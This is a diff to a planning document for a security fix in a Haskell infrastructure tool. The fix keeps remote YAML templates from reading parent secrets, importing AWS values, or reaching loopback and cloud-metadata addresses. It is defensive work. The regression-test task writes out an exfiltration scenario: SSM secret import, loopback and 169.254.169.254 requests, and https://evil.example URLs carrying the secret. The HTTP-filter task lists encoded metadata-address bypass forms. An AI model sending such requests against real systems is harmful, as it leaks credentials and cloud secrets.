@@ -81,37 +81,50 @@ Done when:
 - [ ] HTTP imports requested by untrusted documents cannot reach
   loopback, link-local, unspecified or AWS instance-metadata addresses
   (IPv4, IPv6 and IPv4-mapped forms), checked on the first request and on
-  every redirect hop; tests use a mock HTTP client and resolver (no real
-  network, no socket opened) and cover a literal address, a host name
-  that resolves to a blocked address, and a public URL redirecting to
-  =169.254.169.254=.
-- [ ] =--trust-import-source PREFIX= is repeatable, validated at parse
-  time, and restores today's behaviour (AWS-backed imports, no address
-  filter, parent variables for custom templates) for documents under a
-  listed prefix; a redirect from a trusted URL to a location outside the
-  trusted prefixes is refused; tests cover parsing, prefix boundaries
-  (=https://t.example.com/= does not trust =https://t.example.com.evil/=)
-  and each restored behaviour.
+  every redirect hop, using only the public http-client API; plain HTTP
+  connects to the checked address; with a proxy configured the target
+  host name is still resolved and checked locally before the request goes
+  to the proxy. Tests inject the resolver and a raw-connection factory
+  that serves canned response bytes, so the real http-client parser and
+  redirect logic run with no socket and no real network; they cover a
+  literal address, a host name that resolves to a blocked address, and a
+  public URL redirecting to =169.254.169.254=, plus the real resolver on
+  numeric literals (=AI_NUMERICHOST=, no DNS).
+- [ ] =--trust-import-source PREFIX= is repeatable and validated at parse
+  time; documents under a listed prefix keep today's behaviour
+  (AWS-backed imports, no address filter, parent variables for custom
+  templates), each tested in the task that adds the restriction; a
+  redirect from a trusted URL to a location outside the trusted prefixes
+  is refused; tests cover parsing and prefix boundaries
+  (=https://t.example.com/= does not trust =https://t.example.com.evil/=).
 - [ ] A test reproduces the C4 review's exfiltration scenario (parent
   =$defs= secret, remote document with =ssm:= import and loopback and
   attacker URLs interpolating the secret) through the real dispatcher and
   shows each step blocked; recorded failing on the branch base.
 - [ ] The trust decision lives in one place, next to =isLocalBase= in
   =src/Iidy/Yaml/Imports/Types.hs=; the dispatcher, HTTP loader and engine
-  call it and repeat no trust logic.
+  call it and repeat no trust logic. =isAwsBacked= has one definition,
+  used by the gate and by =GetImport.needsAwsEnv=. One helper builds the
+  dispatcher and passes the same policy to the engine, and one
+  =cfnImportConfig= builds =ImportConfig= from =CfnContext=.
+- [ ] New tests live in their own modules (trusted-source parsing, HTTP
+  guard) rather than growing =test/Test/ImportTrustTest.hs=.
 - [ ] =docs/SECURITY.org=, =docs/import-types.org=,
   =docs/custom-resource-templates.org=, =docs/command-reference.org= and
-  the import-system and custom-resource requirements describe the model;
-  =DIVERGENCES.md= has an entry for each departure from Rust.
+  the import-system and custom-resource requirements describe the model,
+  including the residual risks listed in the docs task; =DIVERGENCES.md=
+  has an entry for each departure from Rust.
 - [ ] Build warning-free, full suite green, each commit names C15.
 
 Stop and record if: an existing fixture or test whose expected output came
 from Rust depends on an imported document seeing parent variables; the
-address check cannot cover the address actually connected to without
-=Network.HTTP.Client.Internal= or a new dependency (record the remaining
-gap instead of widening scope); a change is needed outside the allowed
-paths; =src/Iidy/Yaml/Resolution/Resolver.hs= (already over 900 lines)
-would grow by more than a few lines.
+public http-client API (=managerModifyRequest=, =managerRawConnection=,
+=socketConnection=, =makeConnection=) cannot check every hop's target
+address before connecting (the HTTPS DNS-rebinding window is an accepted,
+documented residual risk, not a stop); the work needs
+=Network.HTTP.Client.Internal= or a new dependency; a change is needed
+outside the allowed paths; =src/Iidy/Yaml/Resolution/Resolver.hs= (already
+over 900 lines) would grow by more than a few lines.
 
 * DONE Write up the options and compare with the TypeScript and Rust versions
 :PROPERTIES:
@@ -211,11 +224,19 @@ accepted, unless marked otherwise.
   location it was requested at, so a request to a URL under a trusted
   prefix may only redirect to locations that are also trusted; any other
   redirect is an error.
-- The root template: a template given on the command line or as
-  =Template:= in stack-args with an =s3:= or =http(s):= location is
-  untrusted like any other document (supervisor's call, fail-closed; it
-  follows from C14's base classification). Users list its prefix to keep
-  its =ssm:= and =cfn:= imports working.
+- HTTPS address pinning (supervisor's call, after the plan review): only
+  the public http-client API is used. Plain HTTP connects to the checked
+  address; for HTTPS, crypton-connection does its own DNS lookup after the
+  check, leaving a DNS-rebinding window. Certificate validation for the
+  requested host name limits it (the metadata service serves no TLS, and a
+  loopback service would need a valid certificate for the attacker's
+  name). It is a documented residual risk.
+- Proxies (supervisor's call, after the plan review): keep honouring
+  =HTTP_PROXY= / =HTTPS_PROXY=, since disabling them would break users
+  behind corporate proxies. For untrusted requesters the target host name
+  is resolved locally and refused if blocked before the request goes to
+  the proxy; the proxy may resolve the name differently, which is a
+  documented residual risk. The proxy's own address is not filtered.
 - Bare relative import from a remote document (found by C14): keep
   rejecting it and correct the documents that describe inheritance
   (=docs/SECURITY.org= "Relative Import Behavior", =docs/import-types.org=
@@ -241,7 +262,173 @@ then sees only the document's own variables. Tests in
 =:128-260=): a local child referencing a parent =$defs= value fails with a
 variable error naming it; a child interpolating a parent variable into its
 own import location fails; a child using its own =$defs= still works.
-Record the first test failing on the branch base.
+Every child in these tests must carry its own =$defs= (or =$imports=):
+=processImportedDoc= resolves only such children (=Engine.hs:226=,
+=:249-251=), so a child without either passes on the base too. Record the
+first test failing on the branch base.
+
+** Plan review 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e706-45b3-7272-a5c6-111f0fed2f28
+:ADDED: [2026-11-16 Mon 18:01]
+:END:
+Verdict: revise first. The plan closes every step of the C4 scenario, but
+task 4's pinning mechanism is not available in the public http-client API
+and would trip its own stop rule on the first line of code (finding 1).
+
+Completeness, checked against source: parent secret via variables (task 1,
+task 5); =ssm:= from a remote document (task 3); loopback and metadata
+(task 4); attacker URL built from imported values (closed by tasks 1, 3
+and 4 together, since a remote document's variables can then hold only its
+own non-secret imports); redirects (task 4); custom templates (task 5);
+documents loaded via =ssm:= / =cfn:= (C14 classification, then
+=isTrustedBase=). Handlebars helpers and =!$= cannot reach the network:
+=resolveAst= is pure (=Either=), so the only I/O channel is =$imports= in
+=loadImportsAndDefs=. Both =s3:= forms, =git:= and =filehash:= are already
+covered by =parseImportType= / =isLocalOnly= (=Types.hs:61-87=, =:146-153=).
+Stack-args =$imports= resolve against the local argsfile
+(=Cfn/StackArgsLoader.hs:110=). No missed path beyond findings 8 and 9.
+
+1. Task 4 (blocker). =hostAddress= and =getRedirectedRequest= are
+   exported only from =Network.HTTP.Client.Internal= in http-client 0.7.19
+   (checked in the installed haddock), and http-client-tls 0.3.6.4
+   =getTlsConnection= ignores its =HostAddress= argument (=\_ha host port=),
+   so HTTPS would not be pinned even with Internal; =HostAddress= is also
+   IPv4 only. Change the task to the public API: build the manager from
+   =tlsManagerSettings= with (a) =managerModifyRequest=, which http-client
+   runs on every redirect hop (=Core.responseOpen= =go= calls
+   =getModifiedRequestManager= per hop), checking each hop's =getUri=
+   against the guard (resolve host, refuse blocked addresses; trusted-prefix
+   redirect rule), keeping =redirectCount= and dropping the manual redirect
+   loop; (b) a wrapped =managerRawConnection= that resolves through the
+   injected resolver, refuses blocked addresses, connects its own socket to
+   the checked address (=network= is already a dependency) and returns the
+   public =socketConnection=, which pins plain HTTP for IPv4 and IPv6. The
+   remaining gap is a DNS-rebinding window for HTTPS between the check and
+   crypton-connection's own lookup; certificate validation for the
+   requested host name limits it (the metadata service serves no TLS, and a
+   loopback service would need a valid certificate for the attacker's
+   name). Record that gap in =docs/SECURITY.org= and =DIVERGENCES.md=.
+   Rewrite the stop rule: stop only if the public API cannot check every
+   hop's address before connecting, not for the HTTPS pin. Http.hs's
+   =catches= (=:91-93=) needs a handler for the guard's exception.
+2. Task 4 (needs a supervisor's call). =newTlsManager= honours
+   =HTTP_PROXY= / =HTTPS_PROXY=; with a proxy the raw connection goes to
+   the proxy (a loopback proxy would be refused) and the proxy resolves the
+   target unchecked. Add to the task either =managerSetProxy noProxy= for
+   filtered requests, or a name check of the target in
+   =managerModifyRequest= with the proxy hop exempt and the gap recorded.
+3. Task 4 (test seam). None exists: =loadHttpImport= builds its own
+   manager (=Http.hs:53-56=) and =ImportConfig= (=Dispatch.hs:35-38=) has no
+   client. The task adds one; make the seam the resolver plus the
+   connection factory rather than a "one-hop fetch": tests supply a
+   =managerRawConnection= returning the public =makeConnection= over canned
+   response bytes, so the real http-client parser and redirect logic run
+   with no socket. Add one test of the real resolver on numeric literals
+   (=2852039166=, =0251.0376.0251.0376=, =::ffff:a9fe:a9fe=) with
+   =AI_NUMERICHOST= (no DNS, no socket).
+4. Task 2 (duplication). =ImportConfig= is assembled from =CfnContext= by
+   hand at =Cfn/RequestBuilder.hs:64=, =:105=, =:157=,
+   =Cfn/Operations/EstimateCost.hs:44= and
+   =Cfn/Operations/LintTemplate.hs:42= (positional); task 4 adds a field, so
+   each would change twice. Add =cfnImportConfig :: CfnContext ->
+   ImportConfig= in =Cfn/Context.hs= (and one constructor with the default
+   HTTP client) in task 2. Say where =importPolicyFromOpts= lives
+   (=Iidy.Cli=; =Types.hs= must not depend on =GlobalOpts=). The refactor is
+   otherwise behaviour-neutral: =RemoteImports= survives as
+   =ipRemoteImports=, so =Demo.hs:306-311= and the =BlockRemoteImports=
+   literals at =app/Main.hs:142-268= map one to one.
+5. Task 3 (duplication). =GetImport.needsAwsEnv= (=GetImport.hs:87-99=)
+   already classifies the AWS-backed types; define =isAwsBacked= once in
+   =Types.hs= and have =needsAwsEnv= use it.
+6. Task 5 (one owner). The new engine entry point takes trusted sources
+   separately from the dispatcher's =ImportConfig= at four callers, which
+   can then disagree. Add one helper in =Dispatch.hs= (it already imports
+   the engine) that builds the dispatcher and passes the same policy to
+   the engine; =Render.hs=, =Cfn/TemplateLoader.hs=,
+   =Cfn/StackArgsLoader.hs= and =Demo.hs= call only that.
+7. Ordering. Move the flag task to directly after task 2: it is
+   behaviour-neutral until a gate exists, it keeps an escape hatch on main
+   while tasks 3-5 land, and each gate task can then test its restored
+   behaviour through a flag-built policy instead of the flag task testing
+   all of them afterwards. Each task is otherwise green alone and its tests
+   fail before it.
+8. Task 1 (test). =processImportedDoc= only resolves a child that has
+   =$imports= or =$defs= (=Engine.hs:226=, =:249-251=); a child without
+   either is never resolved, so the "parent variable not visible" child
+   must carry =$defs= or the test passes on the base too.
+9. Docs task (decision answer is moot, no contradiction). A remote root
+   template is never preprocessed: =loadCfnTemplate= hands =s3:= /
+   =http(s):= templates to CloudFormation as =TemplateURL=
+   (=Cfn/TemplateLoader.hs:70-73=), =render:= and =iidy render= read local
+   files or stdin only (=:75-78=, =Render.hs:133-137=). Drop "including a
+   root template given as an =s3:= or =http(s):= location" from the
+   user-visible bullets. Add to remaining risks: stdin (=-=) is a local
+   base, so =curl ... | iidy render -= runs a remote template with full
+   trust; and a location the requester builds from imported remote content
+   (=$imports: {c: https://x/c.yaml, v: "{{c.loc}}"}= in a local template)
+   loads with the requester's trust (needs taint tracking, out of scope).
+10. Tasks 6 and 7 (test seam). =runRender= builds its =ImportConfig=
+    internally (=Render.hs:57-61=), so "a render through the real
+    dispatcher with a mock HTTP client" has no injection point. Test at
+    engine level with =mkFullDispatcher= and a test config, as
+    =ImportTrustTest= does with =remoteStubLoader=, or add a =runRenderWith=.
+11. Size. =Resolver.hs= (994 lines) stays within budget only if task 5
+    passes the =TemplateInfo= into =buildReparse= at its call (=:283=) and
+    both sites (=:326=, =:892=) call the =Context.hs= helper; say so in the
+    task. =test/Test/ImportTrustTest.hs= (216 lines) gains tables in tasks
+    2, 3, 4 and 7: put trusted-source parsing in its own test module and
+    the HTTP guard in another. =Cli/Parser.hs= is already 912 lines; the
+    flag adds a few, no split needed for this card. Engine.hs (328),
+    Types.hs (154), Http.hs (152) and Dispatch.hs (103) stay well under.
+
+** Plan revision 2026-11-16
+:PROPERTIES:
+:ID: org:01a1e708-3f0c-7101-8f90-c4e58d27fbe8
+:ADDED: [2026-11-16 Mon 18:03]
+:END:
+By worker claude-C15. Task order is now: (1) isolate imported documents,
+(2) trust policy, (3) flag, (4) AWS-backed gate, (5) HTTP filter, (6)
+custom-template isolation, (7) C4 regression test, (8) docs.
+
+1. Supervisor's call: the HTTP task uses the public API route given in
+   the review (=managerModifyRequest= on every hop, a wrapped
+   =managerRawConnection= over =socketConnection= for plain HTTP),
+   without Internal or a new dependency. The HTTPS DNS-rebinding gap is a
+   documented residual risk (decision bullet, docs task, =DIVERGENCES.md=
+   entry). The stop rule in Scope and gate now stops only if the public
+   API cannot check every hop's address before connecting. The =catches=
+   handler is in the task.
+2. Supervisor's call: proxies stay honoured; for untrusted requesters the
+   target is resolved and checked locally in =managerModifyRequest= before
+   the request goes to the proxy; the proxy's address is not filtered.
+   Recorded as a decision bullet, in the HTTP task, the Done-when item and
+   the docs task's residual risks.
+3. The HTTP task's seam is the resolver plus the raw-connection factory;
+   tests use =makeConnection= over canned bytes; the numeric-literal
+   resolver test is added. The Done-when item says the same.
+4. Task 2 adds =cfnImportConfig= in =Cfn/Context.hs= and one
+   =ImportConfig= constructor in =Dispatch.hs=, used at every construction
+   site, and places =importPolicyFromOpts= in =Iidy.Cli=.
+5. Task 4 defines =isAwsBacked= once and rewrites =GetImport.needsAwsEnv=
+   to use it; added to the Done-when one-owner item.
+6. Task 6 adds one =Dispatch.hs= helper that builds the dispatcher and
+   passes the same policy to the engine; the four callers use only it.
+7. The flag task moved to directly after task 2; each gate task now tests
+   its restored behaviour with a flag-built policy, and the flag task
+   tests only parsing.
+8. Task 1 requires every test child to carry its own =$defs= (or
+   =$imports=); the C4 test's remote document does too.
+9. The root-template bullet is removed from the decision and from the
+   user-visible changes. The docs task's residual risks add stdin as a
+   local base and locations built from imported remote content.
+10. The C4 test and the custom-template tests run through
+    =mkFullDispatcher= with a test config (or a new =runRenderWith=); the
+    flag task no longer claims a render-level test.
+11. Task 6 passes the =TemplateInfo= into =buildReparse= at =:283= and
+    both union sites call the =Context.hs= helper. New tests go in their
+    own modules (trusted-source parsing, HTTP guard, exfiltration);
+    Done-when has an item for it. =Cli/Parser.hs= gets no split.
 
 * TODO Add the trust policy next to isLocalBase and thread it to the dispatcher
 :PROPERTIES:
@@ -262,8 +449,35 @@ unchanged: a trusted source never gains =file:=, =env:= or =git:=. Replace
 =src/Iidy/GetImport.hs:66= and =src/Iidy/Render.hs:60=. =ImportConfig=
 (=src/Iidy/Yaml/Imports/Loaders/Dispatch.hs:35-38=) carries the policy;
 =cfnRemoteImports= (=src/Iidy/Cfn/Context.hs:56=) becomes the policy.
-Table tests for =parseTrustedSource= and =isTrustedBase= in
-=test/Test/ImportTrustTest.hs=, including the prefix boundary case.
+=importPolicyFromOpts= lives in =Iidy.Cli= (=Types.hs= must not depend on
+=GlobalOpts=). Add =cfnImportConfig :: CfnContext -> ImportConfig= in
+=Cfn/Context.hs= and one =ImportConfig= constructor in =Dispatch.hs= that
+fills defaults (task 5 adds the HTTP client field to it), and use them at
+=Cfn/RequestBuilder.hs:64=, =:105=, =:157=,
+=Cfn/Operations/EstimateCost.hs:44=, =Cfn/Operations/LintTemplate.hs:42=,
+=Cfn/Operations/TemplateApproval.hs:81= and the other construction sites,
+so later fields change one place. =RemoteImports= survives as
+=ipRemoteImports=, so =Demo.hs:306-311= and the =BlockRemoteImports=
+literals at =app/Main.hs:142-268= map one to one. Table tests for
+=parseTrustedSource= and =isTrustedBase=, including the prefix boundary
+case, in a new module (for example =test/Test/TrustedSourceTest.hs=), not
+in =ImportTrustTest.hs=.
+
+* TODO Add the --trust-import-source flag
+:PROPERTIES:
+:ID: org:01a1e6fe-2be7-72bd-983a-90c80ff65b52
+:ADDED: [2026-11-16 Mon 17:52]
+:END:
+New flag, iidy-hs only. Behaviour-neutral until a gate exists; it lands
+before the gates so main keeps an escape hatch while tasks 4-6 land, and
+each gate task tests its restored behaviour through a flag-built policy.
+=GlobalOpts= (=src/Iidy/Cli.hs:66-74=) gains the list;
+=src/Iidy/Cli/Parser.hs= (912 lines; the flag adds a few, no split) parses
+a repeatable option next to =--no-remote-imports= (=:137-141=) with
+=parseTrustedSource= as its reader; =src/Iidy/Cli/Help.hs= (next to
+=:271=) documents it; =importPolicyFromOpts= fills =ipTrustedSources=.
+Update =test/Test/Shared.hs:547= and the parser tests. Tests: repeated
+flags accumulate into the policy, an invalid prefix is a parse error.
 
 * TODO Block AWS-backed imports from untrusted documents
 :PROPERTIES:
@@ -271,17 +485,21 @@ Table tests for =parseTrustedSource= and =isTrustedBase= in
 :ADDED: [2026-11-16 Mon 17:52]
 :END:
 New divergence. In =Types.hs=: =isAwsBacked= (=ImportCfn=, =ImportSsm=,
-=ImportSsmPath=, =ImportS3=) and one gate, for example
+=ImportSsmPath=, =ImportS3=), defined once; =GetImport.needsAwsEnv=
+(=src/Iidy/GetImport.hs:87-99=) is rewritten to use it instead of its own
+classification. Add one gate, for example
 =checkImport :: TrustedSources -> Text -> Text -> Either ImportError
 ImportType=, composing =parseImportType= with the AWS-backed check; the
 error names the base and suggests =--trust-import-source=.
 =mkFullDispatcher= (=Dispatch.hs:52-56=) calls it in place of
 =parseImportType=, so the gate runs before =withAwsEnv= and a render
 without credentials reports the trust error. Update the comment at
-=Dispatch.hs:71-73=. Tests: extend =ImportTrustTest= (the
-=untrustedAllowedMatrix= now expects these four types rejected; that is
-the decided change, not a weakened test), a local base and a trusted
-prefix still allowed, and the engine-level =nestedMatrix= pattern for a
+=Dispatch.hs:71-73=. Tests: in =ImportTrustTest= the
+=untrustedAllowedMatrix= now expects these four types rejected (the
+decided change, not a weakened test); in a new module (or the
+trusted-source module from task 2), a local base and a base under a
+flag-built trusted prefix still allowed, and the engine-level
+=nestedMatrix= pattern (=mkFullDispatcher= with a test config) for a
 remote document importing =ssm:=.
 
 * TODO Filter HTTP targets requested by untrusted documents
@@ -289,25 +507,51 @@ remote document importing =ssm:=.
 :ID: org:01a1e6fe-2be7-72bd-983a-90ca9d0e6f5e
 :ADDED: [2026-11-16 Mon 17:52]
 :END:
-New divergence. Split the address logic into a new module beside
-=src/Iidy/Yaml/Imports/Loaders/Http.hs= (152 lines): a pure
-=isBlockedAddress= over resolved socket addresses (the ranges in the
-decision) and an injectable HTTP client record (resolver plus one-hop
-fetch) with a real implementation and room for a mock. In =Http.hs=,
-=fetchHttpStreaming= (=:104-114=) sets =redirectCount 0= and follows
-redirects by hand up to the current limit, using http-client's
-=getRedirectedRequest= for relative =Location= values; before each hop it
-resolves the host, refuses if any address is blocked, and pins the
-connection to the checked address (=hostAddress= on the request) so a
-second DNS answer cannot differ. The dispatcher (=Dispatch.hs:70=) derives
-the request's guard from =Types.hs= (filter when the requester is not
-=isTrustedBase=; restrict redirects to trusted locations when the
-requested URL is under a trusted prefix) and passes it with the client
-from =ImportConfig=. Tests with the mock client only: literal
+New divergence. Public http-client API only: no
+=Network.HTTP.Client.Internal=, no new dependency (=hostAddress= and
+=getRedirectedRequest= are Internal-only in http-client 0.7.19, and
+http-client-tls ignores the =HostAddress= argument). Put the address
+logic in a new module beside =src/Iidy/Yaml/Imports/Loaders/Http.hs= (152
+lines): a pure =isBlockedAddress= over resolved socket addresses (the
+ranges in the decision) and the test seam, a record of the resolver and
+the raw-connection factory (not a "one-hop fetch"), with a real
+implementation over =getAddrInfo= and =network= sockets.
+
+=loadHttpImport= (=Http.hs:53-56=) stops building its own manager with
+=newTlsManager=; for a filtered request it builds one from
+=tlsManagerSettings= with:
+- =managerModifyRequest=, which http-client runs on every redirect hop:
+  it checks the hop's =getUri= against the guard (resolve the host through
+  the injected resolver, refuse if any address is blocked; for a request
+  under a trusted prefix, refuse a hop that leaves the trusted locations).
+  Keep =redirectCount=; no manual redirect loop. This check also covers
+  proxied requests: the target is checked locally before the request goes
+  to the proxy, while the proxy's own address is not filtered.
+- a wrapped =managerRawConnection= that resolves through the injected
+  resolver, refuses blocked addresses, connects its own socket to the
+  checked address and returns the public =socketConnection=, so plain HTTP
+  (IPv4 and IPv6) connects to the address that was checked.
+=HTTP_PROXY= / =HTTPS_PROXY= stay honoured. HTTPS keeps
+crypton-connection's own lookup; the DNS-rebinding window that leaves is
+the documented residual risk in the decision. Add a handler for the
+guard's exception to the =catches= at =Http.hs:91-93=.
+
+The dispatcher (=Dispatch.hs:70=) derives the request's guard from
+=Types.hs= (filter when the requester is not =isTrustedBase=; restrict
+redirects when the requested URL is under a trusted prefix) and passes it
+with the seam from =ImportConfig= (the field added through task 2's
+constructor). Tests, in their own module (for example
+=test/Test/HttpGuardTest.hs=): the injected =managerRawConnection= returns
+the public =makeConnection= over canned response bytes, so the real
+http-client parser and redirect logic run with no socket. Cases: literal
 =127.0.0.1=, =[::1]=, =[::ffff:169.254.169.254]=, =0.0.0.0=; a host name
 resolving to =169.254.169.254=; a public URL redirecting there; a local
-requester allowed to reach loopback; a trusted URL redirecting outside its
-prefix refused; the mock records that no blocked host was fetched.
+requester allowed to reach loopback; a flag-built trusted URL allowed to
+reach loopback and refused when it redirects outside its prefix; the
+fake connection factory records that no blocked address was connected.
+One test runs the real resolver on numeric literals with =AI_NUMERICHOST=
+(no DNS, no socket): =2852039166=, =0251.0376.0251.0376= and
+=::ffff:a9fe:a9fe= must all be blocked.
 
 * TODO Isolate custom templates loaded from untrusted locations
 :PROPERTIES:
@@ -319,46 +563,42 @@ New divergence from Rust (matches TypeScript). Add a field to
 whether the template inherits parent variables, set in
 =src/Iidy/Yaml/Engine.hs:186= from =isTrustedBase= on the template's
 location. The engine needs the trusted sources: add an entry point that
-takes them (keeping =preprocessYaml= for callers with no trusted sources)
-and use it from =Render.hs=, =Cfn/TemplateLoader.hs=,
-=Cfn/StackArgsLoader.hs= and =Demo.hs=. Put one helper choosing the base
+takes them (keeping =preprocessYaml= for callers with no trusted sources),
+and one helper in =Dispatch.hs= (which already imports the engine) that
+builds the dispatcher from an =ImportConfig= and passes the same policy
+to the engine. =Render.hs=, =Cfn/TemplateLoader.hs=,
+=Cfn/StackArgsLoader.hs= and =Demo.hs= call only that helper, so the
+dispatcher and engine cannot disagree. Put one helper choosing the base
 variables in =src/Iidy/Yaml/Resolution/Context.hs= (next to
-=withBindings=) and use it at the two union sites in
-=src/Iidy/Yaml/Resolution/Resolver.hs=: =buildReparse= (=:319-330=, built
-at =:283= where the =TemplateInfo= is in scope) and =resolveExpand=
-(=:892=). Tests (=ResolverTest= =mkTemplateInfo= at =:1275=, and
-=EngineTest=): local, untrusted and trusted templates, each through a
-resource type and through =!$expand=.
-
-* TODO Add the --trust-import-source flag
-:PROPERTIES:
-:ID: org:01a1e6fe-2be7-72bd-983a-90c80ff65b52
-:ADDED: [2026-11-16 Mon 17:52]
-:END:
-New flag, iidy-hs only. =GlobalOpts= (=src/Iidy/Cli.hs:66-74=) gains the
-list; =src/Iidy/Cli/Parser.hs= (next to =--no-remote-imports=,
-=:137-141=) parses a repeatable option with =parseTrustedSource= as its
-reader; =src/Iidy/Cli/Help.hs= (next to =:271=) documents it;
-=importPolicyFromOpts= fills =ipTrustedSources=. Update
-=test/Test/Shared.hs:547= and the parser tests. Tests: repeated flags
-accumulate, an invalid prefix is a parse error, and a render through the
-real dispatcher (stub remote loader, mock HTTP client) behaves as today
-for a listed prefix.
+=withBindings=). In =src/Iidy/Yaml/Resolution/Resolver.hs= (994 lines),
+pass the =TemplateInfo= into =buildReparse= at its call (=:283=) and make
+both union sites (=:326= in =buildReparse=, =:892= in =resolveExpand=)
+call the =Context.hs= helper, so the resolver grows by a few lines only.
+Tests (=ResolverTest= =mkTemplateInfo= at =:1275=, and =EngineTest= or an
+engine-level test through =mkFullDispatcher= with a test config): local,
+untrusted and flag-built trusted templates, each through a resource type
+and through =!$expand=.
 
 * TODO Regression test for the C4 exfiltration scenario
 :PROPERTIES:
 :ID: org:01a1e6fe-2be7-72bd-983a-90c787c0534a
 :ADDED: [2026-11-16 Mon 17:52]
 :END:
-A table-driven engine test in =test/Test/ImportTrustTest.hs= reproducing
+A table-driven engine test in its own module (for example
+=test/Test/ExfiltrationTest.hs=; =runRender= builds its =ImportConfig=
+internally at =Render.hs:57-61=, so test through =mkFullDispatcher= with a
+test config as =ImportTrustTest= does with =remoteStubLoader=, or add a
+=runRenderWith= in =Render.hs=) reproducing
 [[id:org:01a1e68e-1585-707c-91d5-94ce6b11308a][High: remote templates can read secrets and exfiltrate them]]:
 a local parent with =$defs: {secret: ...}= imports
 =https://evil.example/t.yaml= (stub loader); the remote document imports
 =ssm:/prod/db/password=, =http://127.0.0.1:9/{{secret}}=,
 =http://169.254.169.254/latest/meta-data/= and
-=https://evil.example/{{s}}=. Every other location goes through the real
-dispatcher with a recording mock HTTP client. Assert each step is blocked
-and that the mock saw no request carrying the secret. Run it on the
+=https://evil.example/{{s}}=; it carries its own =$defs= so the engine
+resolves it. Every other location goes through the real dispatcher with
+the recording fake connection factory and resolver from task 5. Assert
+each step is blocked and that the fake saw no request carrying the
+secret. Run it on the
 branch base (or with the earlier commits reverted locally) and record the
 failure here.
 
@@ -372,24 +612,38 @@ failure here.
 decision), "What This Allows" (remove AWS integration from untrusted
 documents), and add sections on variable isolation, custom-template
 isolation, the HTTP address filter and redirects, trusted sources, and
-remaining risks (private ranges, parameters a user passes to a remote
-template). =docs/import-types.org= (around =:151=, =:275-277=, and the
+remaining risks:
+- private address ranges are not filtered;
+- parameters a user passes to a remote template reach it;
+- HTTPS DNS rebinding between the check and the TLS library's own lookup,
+  limited by certificate validation for the requested host name;
+- with =HTTP_PROXY= / =HTTPS_PROXY= set, the proxy may resolve the target
+  differently from the local check, and the proxy's own address is not
+  filtered;
+- stdin (=-=) is a local base, so =curl ... | iidy render -= runs a remote
+  template with full trust;
+- a location the requester builds from imported remote content (for
+  example =$imports: {c: https://x/c.yaml, v: "{{c.loc}}"}= in a local
+  template) loads with the requester's trust (closing it needs taint
+  tracking, out of scope).
+
+Also =docs/import-types.org= (around =:151=, =:275-277=, and the
 =ssm:=, =cfn:= and =s3:= sections), =docs/custom-resource-templates.org=
 (the S3 bucket pattern at =:196= and parent-variable access),
 =docs/command-reference.org= (the flag),
 =docs/requirements/03-import-system.org= (around =:440=) and
 =docs/requirements/04-custom-resources.org=. =DIVERGENCES.md=: one entry
-each for the AWS-backed import block, the HTTP address filter and manual
-redirects, custom-template isolation, and =--trust-import-source=; leave
-the C14 relative-import paragraph as is.
+each for the AWS-backed import block, the HTTP address filter (per-hop
+checks, the HTTPS rebinding gap, proxy behaviour), custom-template
+isolation, and =--trust-import-source=; leave the C14 relative-import
+paragraph as is.
 
 User-visible changes to state in the docs:
 - An imported document can no longer read the importing template's
   variables; pass values as =$params= (already true in Rust and
   TypeScript).
 - A remote custom template no longer sees the parent's variables.
-- A remote template, including a root template given as an =s3:= or
-  =http(s):= location, can no longer import =ssm:=, =ssm-path:=, =cfn:= or
+- A remote template can no longer import =ssm:=, =ssm-path:=, =cfn:= or
   =s3:= unless its prefix is trusted.
 - HTTP imports from remote templates cannot reach loopback, link-local or
   metadata addresses, including through redirects.
